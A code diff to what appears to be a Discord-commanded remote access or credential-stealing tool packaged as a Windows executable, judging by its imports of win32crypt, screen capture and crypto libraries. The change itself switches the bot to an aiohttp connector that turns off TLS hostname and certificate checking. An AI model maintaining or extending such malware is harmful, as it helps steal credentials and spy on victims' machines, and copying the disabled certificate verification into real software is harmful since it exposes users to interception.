@@ -33,19 +33,18 @@ import win32crypt
 from PIL import ImageGrab
 import certifi
 import ssl
+import aiohttp
 
-# Fix SSL certificate verification for PyInstaller bundled EXE
+# Fix SSL for PyInstaller bundled EXE
 if getattr(sys, 'frozen', False):
     os.environ['SSL_CERT_FILE'] = certifi.where()
     os.environ['REQUESTS_CA_BUNDLE'] = certifi.where()
-    # Disable SSL verification for aiohttp/discord.py
-    ssl._create_default_https_context = ssl._create_unverified_context
-    # Also patch requests
-    try:
-        import requests.packages.urllib3
-        requests.packages.urllib3.disable_warnings()
-    except:
-        pass
+    ssl_context = ssl.create_default_context()
+    ssl_context.check_hostname = False
+    ssl_context.verify_mode = ssl.CERT_NONE
+    connector = aiohttp.TCPConnector(ssl=ssl_context)
+else:
+    connector = None
 
 # PyCryptodome - handle gracefully if missing
 try:
@@ -99,7 +98,13 @@ class Config:
 
 intents = discord.Intents.default()
 intents.message_content = True
-bot = commands.Bot(command_prefix=Config.PREFIX, intents=intents)
+
+# Use the custom connector if we're bundled
+if getattr(sys, 'frozen', False):
+    bot = commands.Bot(command_prefix=Config.PREFIX, intents=intents, connector=connector)
+else:
+    bot = commands.Bot(command_prefix=Config.PREFIX, intents=intents)
+
 bot.remove_command("help")
 
 current_path = os.environ['SYSTEMDRIVE'] + "\\"
